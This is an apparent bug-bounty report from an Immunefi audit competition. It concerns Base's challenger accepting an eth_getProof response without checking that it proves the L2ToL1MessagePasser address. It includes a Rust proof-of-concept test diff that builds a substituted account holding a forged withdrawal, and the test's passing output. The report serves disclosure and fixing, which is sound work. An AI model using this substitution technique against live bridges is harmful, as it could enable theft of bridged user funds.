# 76425 bc medium eth getproof response is not bound to l2tol1messagepasser allowing a substituted bridge storage root to be accepted

**Submitted on May 4th 2026 at 11:35:57 UTC by @ZeroExRes for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76425
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Direct loss to Base or users ≥ 10% of funds held within Bridge.

## Description

## Brief/Intro

The challenger asks the L2 RPC for an `eth_getProof` of `L2_TO_L1_MESSAGE_PASSER`, but it never checks that the proof returned is actually for that address. A malicious or faulty RPC can return a valid proof for some other account under the same L2 state root. The challenger then uses that account’s `storage_hash` as the message-passer storage root, which can make an invalid output root look valid. In the bridge path, that substituted root can contain forged withdrawal storage.

## Vulnerability Details

In `crates/proof/challenge/src/validator.rs`, the challenger requests the correct account:

```rust
let account_result =
    self.l2_provider.get_proof(Predeploys::L2_TO_L1_MESSAGE_PASSER, rpc_hash).await?;
```

But verification is delegated to `AccountProofVerifier`:

```rust
AccountProofVerifier::verify(&account_result, consensus_header.state_root)?;
```

Inside `crates/proof/challenge/src/verify.rs`, the verifier derives the trie key from the RPC response itself:

```rust
let key = Nibbles::unpack(keccak256(response.address));
```

So the proof is valid for `response.address`, not necessarily for `Predeploys::L2_TO_L1_MESSAGE_PASSER`.

There is no check like:

```rust
response.address == Predeploys::L2_TO_L1_MESSAGE_PASSER
```

After that, the challenger uses:

```rust
let storage_root = account_result.storage_hash;
```

That is the bug. The caller asked for the message-passer account, but the verifier accepts whatever account the RPC says it proved.

The same bug applies to intermediate root validation as well: `validate_intermediate_roots` calls `compute_output_root` for each checkpoint, so a substituted proof can affect every root the challenger validates, not only the final root claim.

## Impact Details

Direct loss to Base or users >= 10% of funds held within Bridge.

`OptimismPortal2.proveWithdrawalTransaction` checks that the supplied `messagePasserStorageRoot` hashes into the dispute game’s root claim, then checks the withdrawal proof against that root. It does not independently prove that the root belongs to the canonical `L2ToL1MessagePasser` account.

So if a bad output root using a substituted storage root is proposed, and challengers rely on this vulnerable proof verification, the proposal can avoid dispute. A forged withdrawal stored under the substituted account’s storage root can then satisfy the portal’s withdrawal proof check.

The validator already treats buggy or compromised RPC data as an explicit threat model: `compute_output_root_with_hash` recomputes the block hash from the consensus header and rejects mismatches, with an in-code comment saying this guards against compromised or buggy RPC nodes. The account proof path is part of the same RPC response surface, but it does not apply the same binding check. The issue is therefore an inconsistent defense: the header is bound to its expected hash, while the account proof is not bound to the requested message-passer address.

## References

* `crates/proof/challenge/src/validator.rs`
* `crates/proof/challenge/src/verify.rs`

## Proof of Concept

Make these changes for PoC. The test builds an L2 state with two accounts, the real message passer and a substituted attacker account, feeds the validator a valid proof for the substituted account, and asserts that `validate_final_root` returns `is_valid = true` for an output root computed from the attacker account's storage hash.

```rust
diff --git a/crates/proof/challenge/src/validator.rs b/crates/proof/challenge/src/validator.rs
index 96c703e46..12650cf2d 100644
--- a/crates/proof/challenge/src/validator.rs
+++ b/crates/proof/challenge/src/validator.rs
@@ -391,9 +391,14 @@ impl<L2: L2Provider> OutputValidator<L2> {
 mod tests {
     use std::sync::Arc;
 
-    use alloy_consensus::Header as ConsensusHeader;
-    use alloy_primitives::{Address, B256};
-    use alloy_rpc_types_eth::Header as RpcHeader;
+    use alloy_consensus::{EMPTY_ROOT_HASH, Header as ConsensusHeader};
+    use alloy_primitives::{Address, B256, Bytes, U256, keccak256};
+    use alloy_rlp::Encodable;
+    use alloy_rpc_types_eth::{EIP1186AccountProofResponse, Header as RpcHeader};
+    use alloy_trie::{
+        HashBuilder, Nibbles, TrieAccount,
+        proof::{ProofRetainer, verify_proof},
+    };
     use rstest::rstest;
 
     use super::*;
@@ -418,6 +423,88 @@ mod tests {
         (provider, roots)
     }
 
+    fn encode_account(storage_hash: B256) -> Vec<u8> {
+        let account = TrieAccount {
+            nonce: 0,
+            balance: U256::ZERO,
+            storage_root: storage_hash,
+            code_hash: B256::ZERO,
+        };
+        let mut encoded = Vec::with_capacity(account.length());
+        account.encode(&mut encoded);
+        encoded
+    }
+
+    fn encode_storage_value(value: U256) -> Vec<u8> {
+        let mut encoded = Vec::with_capacity(value.length());
+        value.encode(&mut encoded);
+        encoded
+    }
+
+    fn withdrawal_storage_key(withdrawal_hash: B256) -> B256 {
+        let mut encoded = Vec::with_capacity(64);
+        encoded.extend_from_slice(withdrawal_hash.as_slice());
+        encoded.extend_from_slice(&U256::ZERO.to_be_bytes::<32>());
+        keccak256(encoded)
+    }
+
+    fn build_storage_root_with_forged_withdrawal(storage_key: B256) -> (B256, Vec<Bytes>, Vec<u8>) {
+        let secure_key = keccak256(storage_key);
+        let secure_path = Nibbles::unpack(secure_key);
+        let value = encode_storage_value(U256::from(1));
+
+        let mut hb =
+            HashBuilder::default().with_proof_retainer(ProofRetainer::new(vec![secure_path]));
+        hb.add_leaf(secure_path, &value);
+
+        let storage_root = hb.root();
+        let proof_nodes = hb.take_proof_nodes();
+        let proof = proof_nodes.into_nodes_sorted().into_iter().map(|(_, v)| v).collect();
+
+        (storage_root, proof, value)
+    }
+
+    fn build_header_with_substituted_account_proof(
+        block_number: u64,
+        message_passer_storage_hash: B256,
+        substituted_address: Address,
+        substituted_storage_hash: B256,
+    ) -> (ConsensusHeader, EIP1186AccountProofResponse) {
+        let message_passer_key = keccak256(Predeploys::L2_TO_L1_MESSAGE_PASSER);
+        let substituted_key = keccak256(substituted_address);
+        let substituted_path = Nibbles::unpack(substituted_key);
+
+        let mut leaves = vec![
+            (message_passer_key, encode_account(message_passer_storage_hash)),
+            (substituted_key, encode_account(substituted_storage_hash)),
+        ];
+        leaves.sort_by(|(left, _), (right, _)| left.as_slice().cmp(right.as_slice()));
+
+        let mut hb =
+            HashBuilder::default().with_proof_retainer(ProofRetainer::new(vec![substituted_path]));
+        for (key, encoded) in leaves {
+            hb.add_leaf(Nibbles::unpack(key), &encoded);
+        }
+
+        let state_root = hb.root();
+        let proof_nodes = hb.take_proof_nodes();
+        let account_proof: Vec<Bytes> =
+            proof_nodes.into_nodes_sorted().into_iter().map(|(_, v)| v).collect();
+
+        let header = ConsensusHeader { number: block_number, state_root, ..Default::default() };
+        let account_result = EIP1186AccountProofResponse {
+            address: substituted_address,
+            account_proof,
+            balance: U256::ZERO,
+            code_hash: B256::ZERO,
+            nonce: 0,
+            storage_hash: substituted_storage_hash,
+            storage_proof: vec![],
+        };
+
+        (header, account_result)
+    }
+
     #[rstest]
     #[case::valid(None, true)]
     #[case::invalid(Some(B256::repeat_byte(0xFF)), false)]
@@ -440,6 +527,72 @@ mod tests {
         assert_eq!(result.invalid_intermediate_index, None);
     }
 
+    #[tokio::test]
+    async fn test_unbound_account_proof_allows_substituted_message_passer_storage_root() {
+        let block_number = 100;
+        let message_passer_storage_hash = EMPTY_ROOT_HASH;
+        let forged_withdrawal_hash = B256::repeat_byte(0xAB);
+        let forged_storage_key = withdrawal_storage_key(forged_withdrawal_hash);
+        let (substituted_storage_hash, forged_withdrawal_proof, forged_withdrawal_value) =
+            build_storage_root_with_forged_withdrawal(forged_storage_key);
+        let substituted_address = Address::repeat_byte(0x99);
+
+        let (header, substituted_account) = build_header_with_substituted_account_proof(
+            block_number,
+            message_passer_storage_hash,
+            substituted_address,
+            substituted_storage_hash,
+        );
+        let block_hash = header.hash_slow();
+        let correct_root =
+            OutputRoot::from_parts(header.state_root, message_passer_storage_hash, block_hash)
+                .hash();
+        let substituted_root =
+            OutputRoot::from_parts(header.state_root, substituted_storage_hash, block_hash).hash();
+
+        assert_ne!(substituted_address, Predeploys::L2_TO_L1_MESSAGE_PASSER);
+        assert_ne!(substituted_root, correct_root);
+        assert_eq!(forged_withdrawal_value, vec![0x01]);
+
+        // The forged withdrawal only exists under the substituted account.
+        assert!(
+            verify_proof(
+                substituted_storage_hash,
+                Nibbles::unpack(keccak256(forged_storage_key)),
+                Some(forged_withdrawal_value.clone()),
+                &forged_withdrawal_proof
+            )
+            .is_ok()
+        );
+        assert!(
+            verify_proof(
+                message_passer_storage_hash,
+                Nibbles::unpack(keccak256(forged_storage_key)),
+                Some(forged_withdrawal_value),
+                &forged_withdrawal_proof
+            )
+            .is_err()
+        );
+
+        // The validator still accepts the substituted root.
+        let mut provider = MockL2Provider::new();
+        provider.insert_block(block_number, header, substituted_account);
+        let validator = OutputValidator::new(Arc::new(provider));
+
+        let (_, computed_root) =
+            validator.compute_output_root_with_hash(block_number).await.unwrap();
+        assert_eq!(computed_root, substituted_root);
+        assert_ne!(computed_root, correct_root);
+
+        let result = validator
+            .validate_final_root(Address::repeat_byte(0x42), block_number, substituted_root)
+            .await
+            .unwrap();
+
+        assert!(result.is_valid);
+        assert_eq!(result.expected_root, substituted_root);
+    }
+
     /// Valid intermediate roots: all checkpoints match expected output roots.
     #[tokio::test]
     async fn test_validate_intermediate_roots_valid() {
```

Run:

```bash
cargo test -p base-challenger test_unbound_account_proof_allows_substituted_message_passer_storage_root -- --nocapture
```

Output:

```
test validator::tests::test_unbound_account_proof_allows_substituted_message_passer_storage_root ... ok
```
